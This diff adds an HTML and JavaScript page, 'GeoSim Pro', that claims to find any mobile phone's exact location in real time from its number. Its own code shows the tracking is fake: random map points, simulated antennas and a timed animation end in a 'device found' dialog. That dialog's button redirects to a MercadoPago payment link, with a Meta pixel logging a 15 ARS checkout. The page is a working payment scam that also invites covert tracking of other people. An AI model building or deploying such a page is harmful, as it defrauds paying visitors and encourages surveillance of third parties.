@@ -1,0 +1,572 @@
+<!doctype html>
+<html lang="es">
+<head>
+  <meta charset="utf-8" />
+  <title>GeoSim Pro </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
+  <style>
+    :root{
+      --bg-img: url("https://images.unsplash.com/photo-1451187580459-43490279c0fa?q=80&w=2000&auto=format&fit=crop");
+      --bg-int-img: url("https://images.unsplash.com/photo-1504384308090-c894fdcc538d?q=80&w=1600&auto=format&fit=crop");
+      --bg:#060b17; --bg2:#0a1426; --glass:rgba(255,255,255,.06);
+      --card:rgba(255,255,255,.04); --border:rgba(255,255,255,.12);
+      --txt:#eaf3ff; --muted:#a9bbd8; --ok:#86efac; --err:#feb2b2;
+      --accent:#67b0ff; --accent2:#8cd1ff; --brand:#93c5fd; --shadow:0 12px 50px rgba(0,0,0,.45);
+      --radius:14px;
+    }
+    *{box-sizing:border-box}
+    html,body{height:100%}
+    body{margin:0;font-family:Inter,system-ui,Segoe UI,Roboto,Arial;color:var(--txt);background:var(--bg);display:flex;flex-direction:column}
+    body::before{content:"";position:fixed;inset:0;z-index:-2;pointer-events:none;background-image:var(--bg-img);background-size:cover;background-position:center;filter:saturate(.9)brightness(.55)}
+    body::after{content:"";position:fixed;inset:0;z-index:-1;pointer-events:none;background:radial-gradient(1400px 800px at 80% -10%, rgba(25,45,85,.65) 0%, transparent 70%),linear-gradient(180deg, rgba(6,11,23,.85), rgba(10,20,38,.85));mask-image: radial-gradient(80% 80% at 50% 20%, rgba(0,0,0,.95), transparent 120%)}
+    @media (min-width:1024px){ body::before{background-attachment:fixed} }
+
+    .header{position:sticky;top:0;z-index:20;display:flex;align-items:center;justify-content:space-between;padding:12px 18px;border-bottom:1px solid var(--border);background:linear-gradient(180deg, rgba(12,20,40,.75), rgba(12,20,40,.55));backdrop-filter: blur(10px)}
+    .brand{display:flex;align-items:center;gap:10px;font-weight:800;letter-spacing:.02em}
+    .logo{width:32px;height:32px;border-radius:9px;position:relative;overflow:hidden;background:conic-gradient(from 140deg, #6aa9ff, #b0e1ff, #6aa9ff);box-shadow:0 6px 22px rgba(103,176,255,.35)}
+    .logo::after{content:"";position:absolute;inset:2px;border-radius:7px;background:#0a1426}
+    .pill{font-size:11px;padding:4px 9px;border-radius:999px;background:linear-gradient(90deg, rgba(147,197,253,.16), rgba(103,176,255,.16));border:1px solid rgba(147,197,253,.35);color:#cfe5ff}
+    .footer{margin-top:auto;padding:16px 18px;font-size:12px;color:var(--muted);border-top:1px solid var(--border);background:linear-gradient(180deg, rgba(12,20,40,.25), rgba(12,20,40,.35));backdrop-filter: blur(6px)}
+
+    .container{width:min(1200px,100%);margin:18px auto;padding:0 16px;position:relative;z-index:1}
+    .shell{position:relative;overflow:hidden;border:1px solid var(--border);border-radius:var(--radius);background:linear-gradient(180deg, rgba(255,255,255,.03), rgba(255,255,255,.02));box-shadow:var(--shadow)}
+    .shell::before{content:"";position:absolute;inset:0;z-index:-1;pointer-events:none;background-image:var(--bg-int-img);background-size:cover;background-position:center;filter:blur(18px) saturate(.8) brightness(.55);opacity:.45}
+    .topbar{display:flex;align-items:center;justify-content:space-between;gap:8px;padding:12px 14px;border-bottom:1px solid var(--border);background:linear-gradient(180deg, rgba(255,255,255,.04), rgba(255,255,255,.02));backdrop-filter: blur(4px)}
+    .topbar .title{font-weight:800;font-size:15px;letter-spacing:.03em}
+    .topbar .sub{font-size:12px;color:var(--muted)}
+    .grid{display:grid;grid-template-columns:420px 1fr;gap:16px;padding:14px}
+    @media (max-width:980px){.grid{grid-template-columns:1fr}}
+
+    .panel{border:1px solid var(--border);border-radius:12px;background:rgba(8,16,32,.55);backdrop-filter: blur(10px);padding:14px;display:flex;flex-direction:column;gap:12px;box-shadow:inset 0 1px 0 rgba(255,255,255,.04)}
+    h2{margin:0;font-size:16px}
+    label{font-size:13px;color:#d8e6ff}
+    .row{display:flex;gap:8px;align-items:center}
+    select,input,button{-webkit-appearance:none;appearance:none;outline:none;border-radius:11px;border:1px solid rgba(255,255,255,.12);background:rgba(255,255,255,.06);color:var(--txt);padding:12px 12px;font-size:15px;transition:border-color .15s, transform .06s ease}
+    select:focus,input:focus{border-color:var(--accent)}
+    select{min-width:240px} input{flex:1}
+    .hint{font-size:12px;color:var(--muted)}
+    .status{min-height:20px;font-size:13px}.status.ok{color:var(--ok)} .status.err{color:var(--err)}
+    .btn{cursor:pointer;font-weight:800;border:0}
+    .btnPrimary{background:linear-gradient(90deg, var(--accent), var(--accent2));color:#05253f;box-shadow:0 8px 24px rgba(103,176,255,.32)}
+    .btnPrimary:active{transform:translateY(1px)}
+    .btnGhost{background:transparent;border:1px solid rgba(255,255,255,.25)}
+    .btn:disabled{opacity:.6;cursor:not-allowed}
+    .progress{height:10px;border-radius:999px;background:rgba(255,255,255,.10);overflow:hidden;display:none}
+    .progress>i{display:block;height:100%;width:0;background:linear-gradient(90deg, var(--accent), var(--accent2))}
+
+    .mapWrap{position:relative;border:1px solid var(--border);border-radius:12px;overflow:hidden;background:rgba(5,12,24,.6);backdrop-filter: blur(6px);box-shadow: inset 0 1px 0 rgba(255,255,255,.03)}
+    #map{width:100%;height:620px}
+    @media (max-width:980px){#map{height:480px}}
+    .hud{position:absolute;left:12px;top:12px;z-index:5;display:flex;flex-direction:column;gap:8px;padding:10px 12px;border-radius:12px;backdrop-filter: blur(8px);background:rgba(5,15,30,.55);border:1px solid rgba(255,255,255,.08);max-width:min(92%,460px)}
+    .hudTitle{font-weight:700;font-size:13px;letter-spacing:.04em;color:#cfe5ff}
+    .hudStep{font-size:13px;color:#eaf3ff}
+    .hudSub{font-size:12px;color:var(--muted)}
+    .spinner{width:16px;height:16px;border:2px solid rgba(255,255,255,.25);border-top-color:#7fb7ff;border-radius:50%;animation:spin 1s linear infinite;display:inline-block;margin-right:8px;vertical-align:-3px}
+    @keyframes spin{to{transform:rotate(360deg)}}
+
+    .modalBack{position:fixed;inset:0;display:none;align-items:center;justify-content:center;background:rgba(2,6,23,.65);z-index:50}
+    .modal{width:min(720px,94%);border:1px solid var(--border);border-radius:16px;background:linear-gradient(180deg, rgba(255,255,255,.05), rgba(255,255,255,.02));box-shadow: var(--shadow);padding:18px;backdrop-filter: blur(8px)}
+    .modal h3{margin:0 0 8px 0}
+    .modal .actions{display:flex;gap:10px;justify-content:flex-end;margin-top:12px;flex-wrap:wrap}
+    .btnDownload{background:linear-gradient(90deg,#22c55e,#7ee7b6);color:#042f1a;border:0;padding:10px 14px;border-radius:10px;font-weight:800;cursor:pointer}
+  </style>
+
+  <!-- Meta Pixel Code (ID: 2587292611639407) -->
+  <script>
+    !function(f,b,e,v,n,t,s)
+    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+    n.queue=[];t=b.createElement(e);t.async=!0;
+    t.src=v;s=b.getElementsByTagName(e)[0];
+    s.parentNode.insertBefore(t,s)}(window, document,'script',
+    'https://connect.facebook.net/en_US/fbevents.js');
+    fbq('init', '2587292611639407');
+    fbq('track', 'PageView');
+  </script>
+  <noscript>
+    <img height="1" width="1" style="display:none"
+         src="https://www.facebook.com/tr?id=2587292611639407&ev=PageView&noscript=1"/>
+  </noscript>
+  <!-- Pixel: InitiateCheckout on click "Seguir Ubicación" -->
+  <script>
+    // Usamos captura a nivel documento para garantizar el disparo
+    document.addEventListener('click', function(e){
+      var t = e.target;
+      if (!window.fbq) return;
+      // Coincide si clic directo en el botón o en un hijo dentro del botón
+      if ((t && t.id === 'downloadBtn') || (t.closest && t.closest('#downloadBtn'))) {
+        fbq('track', 'InitiateCheckout', {
+          content_name: 'Seguimiento de ubicación',
+          value: 15.00,
+          // Comentado: moneda de Perú
+          // currency: 'PEN'
+          // Argentina
+          currency: 'ARS'
+        });
+      }
+    }, true);
+  </script>
+  <!-- FIN Meta Pixel -->
+
+  <!-- CONFIG del backend -->
+  <script>
+    /* Si el backend está en el mismo origen, deja API_BASE = "" */
+    const API_BASE = "http://localhost:3000"; // <-- CAMBIA esto a tu backend
+    window.gm_authFailure = () => { alert("Google Maps rechazó la clave o el dominio. Revisa billing, APIs y referrers."); };
+  </script>
+</head>
+<body>
+  <header class="header">
+    <div class="brand"><div class="logo" aria-hidden="true"></div><div>GeoSim <span style="opacity:.85">Pro</span></div></div>
+    <div class="pill">LOCALIZA · RASTREA</div>
+  </header>
+
+  <main class="container">
+    <section class="shell">
+      <div class="topbar">
+        <div class="title">Sistema de Geolocalización</div>
+        <div class="sub">Barrido por distritos (3:00) · Heatmap + radar + triangulación · Final en <b>Ubicacion</b></div>
+      </div>
+
+      <div class="grid">
+        <aside class="panel">
+          <h2>Ingresa el Numero Movil</h2>
+          <div class="hint">Localizamos el telefono <b>Movil</b> (Dispositivo). Donde se encuentre.</div>
+
+          <label for="country">País (Ubicacion Actual)</label>
+          <div class="row"><select id="country"></select></div>
+          <div class="hint" id="ipDetect">Detectando ciudad por IP…</div>
+
+          <label for="number">Número local</label>
+          <div class="row"><input id="number" inputmode="tel" placeholder="Ej: 987654321" maxlength="16" /></div>
+
+          <div class="row">
+            <button id="simulateBtn" class="btn btnPrimary" disabled>Iniciar Busqueda</button>
+            <button id="resetBtn" class="btn btnGhost">Reiniciar</button>
+          </div>
+
+          <div class="status" id="status">Listo.</div>
+          <div class="progress" id="progress"><i id="bar"></i></div>
+          <div class="hint" id="eta" style="display:none">Tiempo restante: 180 s</div>
+
+          <div class="hint" style="margin-top:6px">* Localiza en tiempo real. Ubicacion Exacta .</div>
+        </aside>
+
+        <div class="mapWrap">
+          <div id="map" role="application" aria-label="Mapa de la simulación"></div>
+          <div class="hud" id="hud" style="display:none">
+            <div class="hudTitle"><span class="spinner"></span>Localización (Movil) en curso</div>
+            <div class="hudStep" id="hudStep">Inicializando módulos…</div>
+            <div class="hudSub" id="hudSub">Señales de red · GNSS · Wi-Fi público</div>
+            <div class="hudSub" id="hudCarrier" style="display:none"></div>
+          </div>
+        </div>
+      </div>
+    </section>
+  </main>
+
+  <footer class="footer">© 2025 · GeoSim Pro — Localizacion. Para uso de Ubicacion únicamente.</footer>
+
+  <div class="modalBack" id="modalBack" role="dialog" aria-modal="true">
+  <div class="modal" role="document">
+    <h3>Dispositivo Encontrado</h3>
+    <div id="modalText" style="color:#eaf7ff">
+      Se encontró una ubicación.
+    </div>
+    <div class="hint">
+      Datos recopilados en Google Maps; Sigue la ubicación desde tu dispositivo.
+    </div>
+    <div class="actions">
+      <!-- IMPORTANTE: type="button" para evitar submit -->
+      <button id="downloadBtn" class="btnDownload" type="button">Seguir Ubicación</button>
+      <button id="closeModal" class="btn btnGhost" type="button">Cerrar</button>
+    </div>
+  </div>
+</div>
+
+<script>
+  (function () {
+    const btn = document.getElementById('downloadBtn');
+
+    // Listener en fase de captura para adelantarse a otros
+    btn.addEventListener('click', function (e) {
+      // Bloquea cualquier comportamiento por defecto y otros listeners
+      e.preventDefault();
+      e.stopPropagation();
+      if (typeof e.stopImmediatePropagation === 'function') {
+        e.stopImmediatePropagation();
+      }
+
+      // Si el botón está dentro de un form, evita el submit
+      const form = btn.closest('form');
+      if (form) {
+        form.addEventListener('submit', function (ev) { ev.preventDefault(); }, { once: true });
+      }
+
+      // (Opcional) Desactiva anchors que fuercen descarga
+      document.querySelectorAll('a[download]').forEach(a => a.removeAttribute('download'));
+
+      // Redirección en la MISMA ventana
+      // Usa .replace para que no vuelva atrás a la página que disparaba descargas
+      window.location.replace('https://mpago.la/2At7tmZ');
+    }, true); // <-- true = fase de captura
+
+    document.getElementById('closeModal').addEventListener('click', function () {
+      document.getElementById('modalBack').style.display = 'none';
+    });
+  })();
+</script>
+
+
+
+
+  <script>
+    /* ===== Países (bandera + prefijo) ===== */
+    const COUNTRIES = [
+      // País Perú (comentado para AR)
+      // {flag:"🇵🇪", name:"Perú", prefix:"+51",  city:"Lima, Perú", lat:-12.046374, lon:-77.042793, code:'PE'},
+      {flag:"🇪🇸", name:"España", prefix:"+34", city:"Madrid, España", lat:40.416775, lon:-3.70379, code:'ES'},
+      {flag:"🇲🇽", name:"México", prefix:"+52", city:"CDMX, México", lat:19.432608, lon:-99.133209, code:'MX'},
+      {flag:"🇦🇷", name:"Argentina", prefix:"+54", city:"Buenos Aires, Argentina", lat:-34.603722, lon:-58.381592, code:'AR'},
+      {flag:"🇨🇴", name:"Colombia", prefix:"+57", city:"Bogotá, Colombia", lat:4.710989, lon:-74.07209, code:'CO'},
+      {flag:"🇨🇱", name:"Chile", prefix:"+56", city:"Santiago, Chile", lat:-33.44889, lon:-70.669265, code:'CL'},
+      {flag:"🇺🇸", name:"EE. UU./Canadá", prefix:"+1", city:"Nueva York, EE. UU.", lat:40.712776, lon:-74.005974, code:'US'},
+      {flag:"🇬🇧", name:"Reino Unido", prefix:"+44", city:"Londres, Reino Unido", lat:51.507351, lon:-0.127758, code:'GB'}
+    ];
+    const country = document.getElementById('country');
+    COUNTRIES.forEach((c,i)=>{ const o=document.createElement('option'); o.value=i; o.textContent=`${c.flag} ${c.name} (${c.prefix})`; country.appendChild(o); });
+
+    /* ===== Distritos de Lima (centros aprox) — Comentado para migrar a Argentina ===== */
+    /*
+    const LIMA = [
+      {name:"Ancón",lat:-11.77,lon:-77.15,spanKm:5.0},{name:"Ate",lat:-12.05,lon:-76.90,spanKm:4.2},
+      {name:"Barranco",lat:-12.151,lon:-77.021,spanKm:1.8},{name:"Breña",lat:-12.056,lon:-77.055,spanKm:1.6},
+      {name:"Carabayllo",lat:-11.862,lon:-77.026,spanKm:6.0},{name:"Chaclacayo",lat:-11.999,lon:-76.77,spanKm:3.6},
+      {name:"Chorrillos",lat:-12.171,lon:-77.019,spanKm:3.4},{name:"Cieneguilla",lat:-12.07,lon:-76.80,spanKm:4.2},
+      {name:"Comas",lat:-11.944,lon:-77.047,spanKm:4.0},{name:"El Agustino",lat:-12.05,lon:-77.01,spanKm:2.2},
+      {name:"Independencia",lat:-11.989,lon:-77.048,spanKm:2.6},{name:"Jesús María",lat:-12.0795,lon:-77.0534,spanKm:1.6},
+      {name:"La Molina",lat:-12.08,lon:-76.94,spanKm:3.8},{name:"La Victoria",lat:-12.07,lon:-77.03,spanKm:2.0},
+      {name:"Lima",lat:-12.0464,lon:-77.0428,spanKm:2.2},{name:"Lince",lat:-12.089,lon:-77.033,spanKm:1.6},
+      {name:"Los Olivos",lat:-11.969,lon:-77.058,spanKm:3.0},{name:"Lurigancho",lat:-11.95,lon:-76.70,spanKm:6.0},
+      {name:"Lurín",lat:-12.27,lon:-76.87,spanKm:6.0},{name:"Magdalena del Mar",lat:-12.0945,lon:-77.0735,spanKm:1.8},
+      {name:"Miraflores",lat:-12.1211,lon:-77.0290,spanKm:2.4},{name:"Pachacámac",lat:-12.18,lon:-76.87,spanKm:5.0},
+      {name:"Pucusana",lat:-12.48,lon:-76.79,spanKm:4.0},{name:"Pueblo Libre",lat:-12.0868,lon:-77.0622,spanKm:2.0},
+      {name:"Puente Piedra",lat:-11.8667,lon:-77.08,spanKm:5.0},{name:"Punta Hermosa",lat:-12.33,lon:-76.79,spanKm:3.0},
+      {name:"Punta Negra",lat:-12.36,lon:-76.78,spanKm:3.0},{name:"Rímac",lat:-12.038,lon:-77.029,spanKm:2.6},
+      {name:"San Bartolo",lat:-12.38,lon:-76.78,spanKm:3.0},{name:"San Borja",lat:-12.1015,lon:-76.9982,spanKm:2.2},
+      {name:"San Isidro",lat:-12.0971,lon:-77.0529,spanKm:2.2},{name:"San Juan de Lurigancho",lat:-11.992,lon:-76.997,spanKm:5.0},
+      {name:"San Juan de Miraflores",lat:-12.155,lon:-76.97,spanKm:3.6},{name:"San Luis",lat:-12.0774,lon:-76.991,spanKm:1.8},
+      {name:"San Martín de Porres",lat:-12.0,lon:-77.07,spanKm:4.2},{name:"San Miguel",lat:-12.072,lon:-77.10,spanKm:2.6},
+      {name:"Santa Anita",lat:-12.05,lon:-76.97,spanKm:2.6},{name:"Santa María del Mar",lat:-12.39,lon:-76.78,spanKm:3.0},
+      {name:"Santa Rosa",lat:-11.78,lon:-77.16,spanKm:4.0},{name:"Santiago de Surco",lat:-12.1438,lon:-76.9839,spanKm:3.2},
+      {name:"Surquillo",lat:-12.1219,lon:-77.0107,spanKm:2.0},{name:"Villa El Salvador",lat:-12.209,lon:-76.94,spanKm:4.8},
+      {name:"Villa María del Triunfo",lat:-12.16,lon:-76.95,spanKm:4.0}
+    ];
+    const CERCADO = LIMA.find(d => d.name.includes("Cercado")) || {name:"Lima (Completado)", lat:-12.0464, lon:-77.0428, spanKm:2.2};
+    */
+
+    /* ===== Barrios de Buenos Aires (CABA) — centros aproximados ===== */
+    const BA_CABA = [
+      {name:"Palermo", lat:-34.588, lon:-58.430, spanKm:3.5},
+      {name:"Recoleta", lat:-34.588, lon:-58.392, spanKm:2.2},
+      {name:"Belgrano", lat:-34.562, lon:-58.456, spanKm:3.0},
+      {name:"Caballito", lat:-34.618, lon:-58.442, spanKm:2.4},
+      {name:"Flores", lat:-34.640, lon:-58.460, spanKm:2.8},
+      {name:"Almagro", lat:-34.609, lon:-58.420, spanKm:1.8},
+      {name:"San Telmo", lat:-34.621, lon:-58.371, spanKm:1.5},
+      {name:"Puerto Madero", lat:-34.607, lon:-58.360, spanKm:1.6},
+      {name:"Retiro", lat:-34.594, lon:-58.374, spanKm:1.8},
+      {name:"La Boca", lat:-34.635, lon:-58.364, spanKm:1.9},
+      {name:"Villa Urquiza", lat:-34.573, lon:-58.489, spanKm:2.6},
+      {name:"Villa Crespo", lat:-34.603, lon:-58.436, spanKm:1.9},
+      {name:"Congreso", lat:-34.610, lon:-58.392, spanKm:1.6},
+      {name:"Parque Patricios", lat:-34.642, lon:-58.402, spanKm:2.1},
+      {name:"Mataderos", lat:-34.654, lon:-58.504, spanKm:3.2},
+      {name:"Monserrat", lat:-34.614, lon:-58.382, spanKm:1.7}
+    ];
+    const MICRO_CENTRO = {name:"Microcentro", lat:-34.6037, lon:-58.3816, spanKm:2.2};
+
+    // DOM
+    const number = document.getElementById('number'), simulateBtn = document.getElementById('simulateBtn'), resetBtn = document.getElementById('resetBtn');
+    const statusEl = document.getElementById('status'), ipDetect = document.getElementById('ipDetect');
+    const progress = document.getElementById('progress'), bar = document.getElementById('bar'), eta = document.getElementById('eta');
+    const hud = document.getElementById('hud'), hudStep = document.getElementById('hudStep'), hudSub = document.getElementById('hudSub');
+    const hudCarrier = document.getElementById('hudCarrier');
+    const modalBack = document.getElementById('modalBack'), modalText = document.getElementById('modalText');
+    const downloadBtn = document.getElementById('downloadBtn'), closeModal = document.getElementById('closeModal');
+
+    function validateDigits(){ const d=(number.value||'').replace(/\D/g,''); const ok=d.length>=9; simulateBtn.disabled=!ok; statusEl.textContent=ok?'Movil válido — listo para localizar.':'Verifica el numero correcto.'; statusEl.className=ok?'status ok':'status'; }
+    number.addEventListener('input', validateDigits); validateDigits();
+
+    /* ===== UTILIDADES lookup operador (real + fallback) ===== */
+    // Mapa Perú (comentado)
+    // const CARRIER_MAP_PE = { "99": "Movistar", "98": "Claro", "96": "Bitel", "94": "Entel" };
+    // Operadores comunes en AR para fallback simulado
+    const CARRIER_MAP_AR = { "11": "Movistar", "15": "Claro", "12": "Personal", "14": "Tuenti" };
+
+    async function fetchWithTimeout(url, ms=8000){
+      const ctrl = new AbortController();
+      const id = setTimeout(()=>ctrl.abort(), ms);
+      try{
+        const r = await fetch(url, { signal: ctrl.signal });
+        clearTimeout(id);
+        return r;
+      }catch(e){
+        clearTimeout(id);
+        throw e;
+      }
+    }
+
+    function showCarrierInHud(name, opts={}){
+      if(!hudCarrier) return;
+      hudCarrier.style.display = "block";
+      if(opts.error){
+        hudCarrier.textContent = `Operador: (no disponible) — ${opts.error}`;
+      }else if(opts.simulated){
+        hudCarrier.textContent = `Operador: ${name} (Buscando)`;
+      }else{
+        hudCarrier.textContent = `Operador: ${name}`;
+      }
+    }
+    function hideCarrierHud(){ if(hudCarrier) hudCarrier.style.display='none'; }
+
+    function detectOperatorSim(countryCode, localDigits){
+      const d = (localDigits||"").replace(/\D/g,"");
+      if(!d) return null;
+      if(countryCode === "AR"){
+        const p2 = d.slice(0,2);
+        if(CARRIER_MAP_AR[p2]) return CARRIER_MAP_AR[p2];
+      }
+      const ops = ["Movistar","Claro","Personal","Tuenti"];
+      const idx = parseInt(d.slice(-2)||"0",10) % ops.length;
+      return ops[idx];
+    }
+
+    async function lookupCarrierReal(e164){
+      const base = (typeof API_BASE === "string") ? API_BASE : "";
+      const url = `${base}/api/operator?e164=${encodeURIComponent(e164)}`;
+      const r = await fetchWithTimeout(url, 8000);
+      if(!r.ok) throw new Error(`HTTP ${r.status}`);
+      const j = await r.json();
+      return j?.name || null;
+    }
+
+    /* ===== MAPS state y helpers visuales ===== */
+    let map, heatmap, heatData, baBounds, baRestriction;
+    let gMarker=null, gCircle=null, ipLoc=null, finalResult=null;
+    let timers=[], progressRAF=null, pulseRAF=null, sweepTimer=null;
+    let sectorPoly=null, towerMarkers=[], towerRanges=[], lobLines=[], intervals=[];
+    const MAP_STYLE=[{featureType:"poi",stylers:[{visibility:"off"}]},{featureType:"transit",stylers:[{visibility:"off"}]},{elementType:"labels.icon",stylers:[{visibility:"off"}]}];
+
+    const kmLat=km=>km/111; const kmLon=(km,lat)=>km/(111*Math.cos(lat*Math.PI/180));
+    const toRad=d=>d*Math.PI/180;
+    function schedule(fn,ms){ const id=setTimeout(fn,ms); timers.push(id); }
+    function clearTimers(){ timers.forEach(clearTimeout); timers=[]; if(progressRAF) cancelAnimationFrame(progressRAF); if(pulseRAF) cancelAnimationFrame(pulseRAF); if(sweepTimer) clearInterval(sweepTimer); clearIntervals(); }
+    function clearIntervals(){ intervals.forEach(clearInterval); intervals=[]; }
+    function resetHeat(){ heatData=new google.maps.MVCArray([]); heatmap.setData(heatData); }
+    function addHeat(lat,lon,w=1){ heatData.push({location:new google.maps.LatLng(lat,lon), weight:w}); }
+    function addHeatCluster(center,spanKm,count,baseW=1){ const {lat,lon}=center; const hl=kmLat(spanKm/2),ho=kmLon(spanKm/2,lat); for(let i=0;i<count;i++){ addHeat(lat+(Math.random()*2-1)*hl, lon+(Math.random()*2-1)*ho, baseW*(0.7+Math.random()*0.6)); } }
+    function randomPointInCircle(center, radiusM){
+      const ang=Math.random()*2*Math.PI, r=Math.sqrt(Math.random())*radiusM;
+      const dLat=(r/1000)/111, dLon=(r/1000)/(111*Math.cos(center.lat*Math.PI/180));
+      return { lat: center.lat + Math.sin(ang)*dLat, lon: center.lon + Math.cos(ang)*dLon };
+    }
+
+    function spawnPing(lat,lon){
+      const c=new google.maps.Circle({map,center:{lat,lng:lon},radius:40,strokeColor:'#7fb7ff',strokeOpacity:.9,strokeWeight:1.5,fillColor:'#7fb7ff',fillOpacity:.18});
+      let t0=null;
+      function step(ts){ if(!t0)t0=ts; const e=(ts-t0); const f=Math.min(1,e/800); c.setRadius(40+f*900); c.setOptions({fillOpacity:.18*(1-f),strokeOpacity:.9*(1-f)}); if(f<1) pulseRAF=requestAnimationFrame(step); else c.setMap(null); }
+      pulseRAF=requestAnimationFrame(step);
+    }
+
+    function sectorPath(center,radiusM,a0,a1,steps=32){
+      const {lat,lon}=center; const path=[new google.maps.LatLng(lat,lon)];
+      for(let i=0;i<=steps;i++){ const ang=toRad(a0+(a1-a0)*(i/steps));
+        const dLat=(radiusM/1000)/111, dLon=(radiusM/1000)/(111*Math.cos(lat*Math.PI/180));
+        const y=lat + Math.sin(ang)*dLat, x=lon + Math.cos(ang)*dLon; path.push(new google.maps.LatLng(y,x)); }
+      return path;
+    }
+    function startSectorSweep(center, radiusM){
+      stopSectorSweep();
+      let ang=Math.floor(Math.random()*360), span=55;
+      sectorPoly=new google.maps.Polygon({map,paths:sectorPath(center,radiusM,ang,ang+span),strokeColor:'#6fb5ff',strokeOpacity:.8,strokeWeight:1,fillColor:'#6fb5ff',fillOpacity:.08});
+      sweepTimer=setInterval(()=>{ ang=(ang+8)%360; sectorPoly.setPaths(sectorPath(center,radiusM,ang,ang+span)); }, 80);
+    }
+    function stopSectorSweep(){ if(sweepTimer) clearInterval(sweepTimer); sweepTimer=null; if(sectorPoly){ sectorPoly.setMap(null); sectorPoly=null; } }
+
+    function clearTriangulation(){
+      towerMarkers.forEach(m=>m.setMap(null)); towerMarkers=[];
+      towerRanges.forEach(c=>c.setMap(null)); towerRanges=[];
+      lobLines.forEach(l=>l.setMap(null)); lobLines=[];
+      clearIntervals();
+    }
+    function makeTowerIcon(){ return {path:"M12 2L6 22h3l1.2-4h5.6L17 22h3L14 2h-2zm-1.2 14 1.2-4 1.2 4h-2.4z",fillColor:"#a3d3ff",fillOpacity:0.95,strokeColor:"#458ad6",strokeWeight:1,scale:1.2,anchor:new google.maps.Point(12,22)}; }
+    function placeTowersAround(center,count=3){
+      clearTriangulation();
+      for(let i=0;i<count;i++){
+        const distKm=2+Math.random()*4, angle=Math.random()*360;
+        const tlat=center.lat + Math.sin(toRad(angle))*kmLat(distKm);
+        const tlon=center.lon + Math.cos(toRad(angle))*kmLon(distKm,center.lat);
+        const m=new google.maps.Marker({map,position:{lat:tlat,lng:tlon},icon:makeTowerIcon(),title:'Antena simulada'});
+        const c=new google.maps.Circle({map,center:{lat:tlat,lng:tlon},radius:800+Math.random()*1200,strokeColor:'#4fa6ff',strokeOpacity:.6,strokeWeight:1,fillColor:'#4fa6ff',fillOpacity:.06});
+        towerMarkers.push(m); towerRanges.push(c);
+        let grow=true; const base=c.getRadius(); const id=setInterval(()=>{ c.setRadius(grow?base*1.08:base*0.92); grow=!grow; }, 900);
+        intervals.push(id);
+      }
+    }
+    function drawLobsTo(target){
+      towerMarkers.forEach(m=>{
+        const l=new google.maps.Polyline({map,path:[m.getPosition(), new google.maps.LatLng(target.lat,target.lon)],strokeColor:'#7fd1a8',strokeOpacity:.9,strokeWeight:1,icons:[{icon:{path:'M 0,-1 0,1',strokeOpacity:1,scale:3},offset:'0',repeat:'10px'}]});
+        lobLines.push(l);
+      });
+    }
+    function drawConfidenceEllipse(center,rx_m=500,ry_m=300,rotDeg=20,steps=64){
+      const pts=[];
+      for(let i=0;i<steps;i++){
+        const t=2*Math.PI*i/steps; const x=rx_m*Math.cos(t), y=ry_m*Math.sin(t);
+        const xr=x*Math.cos(toRad(rotDeg)) - y*Math.sin(toRad(rotDeg));
+        const yr=x*Math.sin(toRad(rotDeg)) + y*Math.cos(toRad(rotDeg));
+        const lat=center.lat + (yr/1000)/111;
+        const lon=center.lon + (xr/1000)/(111*Math.cos(center.lat*Math.PI/180));
+        pts.push(new google.maps.LatLng(lat,lon));
+      }
+      return new google.maps.Polygon({map,paths:pts,strokeColor:'#4f9fff',strokeOpacity:.8,strokeWeight:1,fillColor:'#4f9fff',fillOpacity:.06});
+    }
+
+    function startProgress(durationMs){
+      progress.style.display='block'; eta.style.display='block';
+      const t0=Date.now(); const tick=()=>{ const el=Date.now()-t0; const t=Math.min(1, el/durationMs);
+        bar.style.width=(t*100).toFixed(1)+'%'; eta.textContent='Tiempo restante: '+Math.max(0,Math.ceil((durationMs-el)/1000))+' s';
+        progressRAF=requestAnimationFrame(tick); }; progressRAF=requestAnimationFrame(tick);
+    }
+    function stopProgress(){ if(progressRAF) cancelAnimationFrame(progressRAF); progress.style.display='none'; eta.style.display='none'; bar.style.width='0%' }
+
+    function initMap(){
+      map=new google.maps.Map(document.getElementById('map'),{center:{lat:-34.6037,lng:-58.3816},zoom:12,mapTypeControl:false,streetViewControl:false,fullscreenControl:false,styles:MAP_STYLE});
+      heatData=new google.maps.MVCArray([]); heatmap=new google.maps.visualization.HeatmapLayer({data:heatData,map:null,radius:40,opacity:0.6});
+
+      const lb=new google.maps.LatLngBounds();
+      BA_CABA.forEach(d=>{ const hl=kmLat(d.spanKm/2), ho=kmLon(d.spanKm/2,d.lat); lb.extend(new google.maps.LatLng(d.lat+hl,d.lon+ho)); lb.extend(new google.maps.LatLng(d.lat-hl,d.lon-ho)); });
+      baBounds=lb; map.fitBounds(baBounds); baRestriction={latLngBounds:baBounds, strictBounds:true}; map.setOptions({restriction:baRestriction});
+
+      fetch('https://ipapi.co/json/').then(r=>r.ok?r.json():Promise.reject()).then(d=>{ if(d){ ipLoc=d; ipDetect.textContent=`Detectado por IP: ${d.city||d.region||d.country_name||'—'}`; if(d.country==='AR'){ const i=COUNTRIES.findIndex(x=>x.code==='AR'); if(i>=0) country.value=String(i);} } else { ipDetect.textContent='No se detectó ciudad por IP.'; } }).catch(()=> ipDetect.textContent='No se detectó ciudad por IP.');
+    }
+    window.initMap=initMap;
+
+    function startSimulation(){
+      const idx=+country.value||0, selCountry=COUNTRIES[idx];
+      const digits=(number.value||'').replace(/\D/g,''); if(digits.length<9){ statusEl.textContent='Ingresa al menos 9 dígitos.'; statusEl.className='status err'; return; }
+      if(!map){ statusEl.textContent='Cargando Google Maps…'; return; }
+
+      // Operador: mostrar estado e intentar real → fallback simulado
+      const e164 = `${selCountry.prefix}${digits}`;
+      showCarrierInHud('buscando…');
+      lookupCarrierReal(e164)
+        .then(name => {
+          if(name) showCarrierInHud(name);
+          else     showCarrierInHud(detectOperatorSim(selCountry.code, digits), { simulated:true });
+        })
+        .catch(err => {
+          const sim = detectOperatorSim(selCountry.code, digits);
+          if(sim) showCarrierInHud(sim, { simulated:true });
+          else    showCarrierInHud(null, { error:'sin datos' });
+          console.warn('Carrier lookup error:', err);
+        });
+
